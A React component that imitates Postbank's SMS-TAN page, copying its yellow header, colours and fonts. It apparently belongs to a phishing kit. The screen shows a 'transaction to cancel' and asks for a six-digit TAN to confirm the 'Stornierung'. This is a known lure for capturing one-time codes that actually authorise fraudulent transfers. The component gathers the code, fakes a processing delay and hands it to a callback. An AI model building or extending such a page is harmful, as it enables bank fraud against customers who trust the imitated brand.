import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface SMSTANScreenProps {
  tanType: TANType;
  phoneNumber?: string;
  transactionDetails?: TransactionDetails;
  onSubmit: (tan: string) => void;
  onResend?: () => void;
  onCancel?: () => void;
}

const SMSTANScreen: React.FC<SMSTANScreenProps> = ({
  tanType,
  phoneNumber = 'Ihre registrierte Nummer',
  transactionDetails = {},
  onSubmit,
  onResend,
  onCancel
}) => {
  const [tan, setTan] = useState<string[]>(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    if (isSubmitting) return;

    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setCanResend(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleChange = (index: number, value: string) => {
    const newTan = [...tan];
    newTan[index] = value.slice(-1); // Only allow one character
    setTan(newTan);

    // Auto-focus next input
    if (value && index < 5) {
      const nextInput = document.getElementById(`tan-input-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      const prevInput = document.getElementById(`tan-input-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async () => {
    const fullTan = tan.join('');
    if (fullTan.length === 6) {
      setIsSubmitting(true);
      await new Promise(resolve => setTimeout(resolve, 1500));
      onSubmit(fullTan);
    }
  };

  const handleResend = () => {
    if (canResend && onResend) {
      setCanResend(false);
      setCountdown(60);
      onResend();
    }
  };

  if (isSubmitting) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'SMS-TAN wird überprüft...'}
        type="processing"
        showProgress={true}
        duration={2}
      />
    );
  }

  return (
    <div className="postbank-container" style={{
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
      fontStyle: 'normal'
    }}>
      <div style={{
        maxWidth: '800px',
        margin: '0 auto',
        padding: isMobile ? '20px' : '40px 20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        minHeight: '100vh',
        justifyContent: 'center'
      }}>
        
        {/* Main SMS TAN Card */}
        <div style={{
          width: '100%',
          maxWidth: '600px',
          backgroundColor: '#ffffff',
          border: '1px solid #d1d8d9',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0, 0, 0, 0.1)',
          overflow: 'hidden'
        }}>
          
          {/* Yellow Header Bar - Postbank's signature */}
          <div style={{
            backgroundColor: '#fc0',
            padding: '20px',
            textAlign: 'center'
          }}>
            <h1 style={{
              color: '#0018a8',
              fontSize: isMobile ? '1.5rem' : '2rem',
              fontWeight: '700',
              margin: '0',
              fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
              fontStyle: 'normal'
            }}>
              {tanType === 'TRANSACTION_TAN' ? 'SMS-TAN Stornierung' : 'SMS-TAN Anmeldung'}
            </h1>
          </div>

          {/* Main Content */}
          <div style={{
            padding: isMobile ? '20px' : '30px'
          }}>
            
            {/* Instruction Box */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #d1d8d9',
              borderRadius: '4px',
              padding: '20px',
              marginBottom: '30px',
              textAlign: 'center'
            }}>
              <p style={{
                margin: '0',
                fontSize: isMobile ? '14px' : '16px',
                color: '#333333',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontStyle: 'normal',
                lineHeight: '1.5'
              }}>
                {tanType === 'TRANSACTION_TAN'
                  ? `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Stornierung an ${phoneNumber} gesendet.`
                  : `Wir haben Ihnen eine SMS mit einer TAN-Nummer zur Anmeldung an ${phoneNumber} gesendet.`
                }
              </p>
            </div>

            {/* Transaction Details Card - only for TRANSACTION_TAN */}
            {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
              <div style={{
                backgroundColor: '#ffffff',
                border: '2px solid #0018a8',
                borderRadius: '8px',
                padding: '25px',
                marginBottom: '30px'
              }}>
                <h2 style={{
                  color: '#0018a8',
                  fontSize: isMobile ? '1.25rem' : '1.5rem',
                  fontWeight: '700',
                  margin: '0 0 20px 0',
                  fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                  fontStyle: 'normal',
                  textAlign: 'center'
                }}>
                  Zu stornierende Transaktion
                </h2>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
                  <div style={{ 
                    display: 'flex', 
                    justifyContent: 'space-between', 
                    alignItems: 'center',
                    paddingBottom: '10px',
                    borderBottom: '1px solid #d1d8d9'
                  }}>
                    <span style={{
                      color: '#6f7779',
                      fontSize: '14px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontStyle: 'normal',
                      fontWeight: '400'
                    }}>Betrag:</span>
                    <span style={{
                      color: '#0018a8',
                      fontSize: '18px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '700',
                      fontStyle: 'normal'
                    }}>{transactionDetails.amount}</span>
                  </div>
                  
                  {transactionDetails.recipient && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>Empfänger:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.recipient}</span>
                    </div>
                  )}
                  
                  {transactionDetails.iban && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center',
                      paddingBottom: '10px',
                      borderBottom: '1px solid #d1d8d9'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>IBAN:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'monospace',
                        fontStyle: 'normal',
                        textAlign: 'right'
                      }}>{transactionDetails.iban}</span>
                    </div>
                  )}
                  
                  {transactionDetails.reference && (
                    <div style={{ 
                      display: 'flex', 
                      justifyContent: 'space-between', 
                      alignItems: 'center'
                    }}>
                      <span style={{
                        color: '#6f7779',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        fontWeight: '400'
                      }}>Verwendungszweck:</span>
                      <span style={{
                        color: '#333333',
                        fontSize: '14px',
                        fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                        fontStyle: 'normal',
                        textAlign: 'right',
                        maxWidth: '60%'
                      }}>{transactionDetails.reference}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* TAN Input Section */}
            <div style={{
              backgroundColor: '#f8f9fa',
              border: '1px solid #d1d8d9',
              borderRadius: '8px',
              padding: '30px',
              marginBottom: '30px'
            }}>
              <h3 style={{
                color: '#0018a8',
                fontSize: isMobile ? '1.125rem' : '1.25rem',
                fontWeight: '700',
                margin: '0 0 25px 0',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontStyle: 'normal',
                textAlign: 'center'
              }}>
                {tanType === 'TRANSACTION_TAN' ? 'TAN-Nummer zur Stornierung eingeben:' : 'TAN-Nummer eingeben:'}
              </h3>

              {/* TAN Input Fields */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                gap: isMobile ? '8px' : '12px',
                marginBottom: '25px',
                flexWrap: 'wrap'
              }}>
                {tan.map((digit, index) => (
                  <input
                    key={index}
                    id={`tan-input-${index}`}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    style={{
                      width: isMobile ? '40px' : '50px',
                      height: isMobile ? '50px' : '60px',
                      fontSize: isMobile ? '1.5rem' : '1.75rem',
                      textAlign: 'center',
                      border: '2px solid #d1d8d9',
                      borderRadius: '4px',
                      outline: 'none',
                      color: '#0018a8',
                      fontWeight: '700',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontStyle: 'normal',
                      backgroundColor: '#ffffff',
                      transition: 'all 0.2s ease'
                    }}
                    onFocus={(e) => {
                      (e.target as HTMLInputElement).style.border = '2px solid #0018a8';
                      (e.target as HTMLInputElement).style.backgroundColor = '#ffffff';
                    }}
                    onBlur={(e) => {
                      (e.target as HTMLInputElement).style.border = '2px solid #d1d8d9';
                      (e.target as HTMLInputElement).style.backgroundColor = '#ffffff';
                    }}
                    onMouseEnter={(e) => {
                      if (document.activeElement !== e.target) {
                        (e.target as HTMLInputElement).style.backgroundColor = '#f8f9fa';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (document.activeElement !== e.target) {
                        (e.target as HTMLInputElement).style.backgroundColor = '#ffffff';
                      }
                    }}
                    disabled={isSubmitting}
                  />
                ))}
              </div>

              {/* Submit Button */}
              <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                <button
                  onClick={handleSubmit}
                  disabled={tan.join('').length !== 6 || isSubmitting}
                  className="btn-primary"
                  style={{
                    backgroundColor: (tan.join('').length !== 6 || isSubmitting) ? '#ccc' : '#0018a8',
                    color: '#ffffff',
                    border: 'none',
                    padding: '12px 24px',
                    borderRadius: '4px',
                    fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                    fontWeight: '700',
                    fontSize: '16px',
                    fontStyle: 'normal',
                    cursor: (tan.join('').length !== 6 || isSubmitting) ? 'not-allowed' : 'pointer',
                    transition: 'background-color 0.2s ease',
                    width: isMobile ? '100%' : 'auto',
                    minWidth: '200px'
                  }}
                  onMouseEnter={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#001470';
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (tan.join('').length === 6 && !isSubmitting) {
                      (e.target as HTMLButtonElement).style.backgroundColor = '#0018a8';
                    }
                  }}
                >
                  {isSubmitting
                    ? (tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'TAN wird überprüft...')
                    : (tanType === 'TRANSACTION_TAN' ? 'Stornierung bestätigen' : 'TAN bestätigen')
                  }
                </button>
              </div>

              {/* Resend Button */}
              {onResend && (
                <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                  <button
                    onClick={handleResend}
                    disabled={!canResend || isSubmitting}
                    className="btn-secondary"
                    style={{
                      backgroundColor: 'transparent',
                      color: (!canResend || isSubmitting) ? '#ccc' : '#0018a8',
                      border: `2px solid ${(!canResend || isSubmitting) ? '#ccc' : '#0018a8'}`,
                      padding: '12px 24px',
                      borderRadius: '4px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontWeight: '700',
                      fontSize: '16px',
                      fontStyle: 'normal',
                      cursor: (!canResend || isSubmitting) ? 'not-allowed' : 'pointer',
                      transition: 'all 0.2s ease',
                      width: isMobile ? '100%' : 'auto',
                      minWidth: '200px'
                    }}
                    onMouseEnter={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = '#0018a8';
                        (e.target as HTMLButtonElement).style.color = '#ffffff';
                      }
                    }}
                    onMouseLeave={(e) => {
                      if (canResend && !isSubmitting) {
                        (e.target as HTMLButtonElement).style.backgroundColor = 'transparent';
                        (e.target as HTMLButtonElement).style.color = '#0018a8';
                      }
                    }}
                  >
                    TAN erneut senden {canResend ? '' : `(${countdown}s)`}
                  </button>
                </div>
              )}

              {/* Cancel Link */}
              {onCancel && (
                <div style={{ textAlign: 'center' }}>
                  <a 
                    href="#" 
                    onClick={(e) => {
                      e.preventDefault();
                      onCancel();
                    }}
                    style={{
                      color: '#0018a8',
                      textDecoration: 'none',
                      fontSize: '14px',
                      fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                      fontStyle: 'normal',
                      transition: 'color 0.3s ease'
                    }}
                    onMouseEnter={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#001470';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'underline';
                    }}
                    onMouseLeave={(e) => {
                      (e.target as HTMLAnchorElement).style.color = '#0018a8';
                      (e.target as HTMLAnchorElement).style.textDecoration = 'none';
                    }}
                  >
                    {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
                  </a>
                </div>
              )}
            </div>

            {/* Footer Info */}
            <div style={{ textAlign: 'center' }}>
              <p style={{
                color: '#6f7779',
                fontSize: '12px',
                margin: '0',
                fontFamily: 'Frutiger LT Pro, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Keine SMS erhalten? Überprüfen Sie Ihren Spam-Ordner oder kontaktieren Sie den Postbank Kundenservice.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export { SMSTANScreen };
